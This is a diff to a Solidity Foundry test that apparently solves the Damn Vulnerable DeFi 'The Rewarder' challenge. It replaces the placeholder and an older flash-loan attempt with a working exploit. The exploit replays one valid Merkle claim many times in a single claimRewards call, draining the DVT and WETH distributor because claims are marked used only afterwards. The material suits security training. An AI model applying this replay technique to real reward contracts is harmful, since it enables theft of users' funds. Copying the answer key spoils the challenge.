@@ -145,22 +145,69 @@ contract TheRewarderChallenge is Test {
     }
 
     /**
-     * CODE YOUR SOLUTION HERE
+     * SOLUTION: Exploit the delayed state update in claimRewards by replaying claims.
+     *
+     * The claimRewards function only marks claims as used AFTER processing all transfers,
+     * allowing multiple identical claims to be submitted in a single transaction.
+     *
+     * Steps:
+     * 1. Load the player's valid Merkle proof from the distribution (index 188)
+     * 2. Calculate how many times the individual claim fits into total distributions
+     * 3. Build a large array of repeated claims for both DVT and WETH
+     * 4. Call claimRewards once — the contract transfers all rewards before updating state
+     * 5. Drain the distributor and transfer all recovered tokens to the recovery address
+     *
+     * This bypasses the one-time claim restriction and exploits the critical vulnerability.
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        // Advance time to trigger a new rewards round
-        vm.warp(block.timestamp + 5 days);
+        // Load distribution leaves
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
     
-        // Deploy attacker contract
-        AttackContract attackerContract = new AttackContract(
-            flashLoanPool,
-            rewarderPool,
-            liquidityToken
-        );
+        // Player's claim amounts (index 188)
+        uint256 playerDvtAmount = 11524763827831882;
+        uint256 playerWethAmount = 1171088749244340;
     
-        // Execute flash loan to deposit, claim rewards, withdraw, repay
-        attackerContract.attack(TOKENS_IN_LENDER_POOL);
-    }
+        // Calculate number of claims needed
+        uint256 dvtClaims = TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDvtAmount;
+        uint256 wethClaims = TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWethAmount;
+        uint256 totalClaims = dvtClaims + wethClaims;
+    
+        // Setup tokens
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+    
+        // Build repeated claims
+        Claim[] memory claims = new Claim[](totalClaims);
+        for (uint256 i = 0; i < totalClaims; i++) {
+            if (i < dvtClaims) {
+                claims[i] = Claim({
+                    batchNumber: 0,
+                    amount: playerDvtAmount,
+                    tokenIndex: 0,
+                    proof: merkle.getProof(dvtLeaves, 188)
+                });
+            } else {
+                claims[i] = Claim({
+                    batchNumber: 0,
+                    amount: playerWethAmount,
+                    tokenIndex: 1,
+                    proof: merkle.getProof(wethLeaves, 188)
+                });
+            }
+        }
+    
+        // Exploit: claim all rewards in one transaction
+        distributor.claimRewards({
+            inputClaims: claims,
+            inputTokens: tokensToClaim
+        });
+    
+        // Transfer recovered funds to recovery account
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
+    }   
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
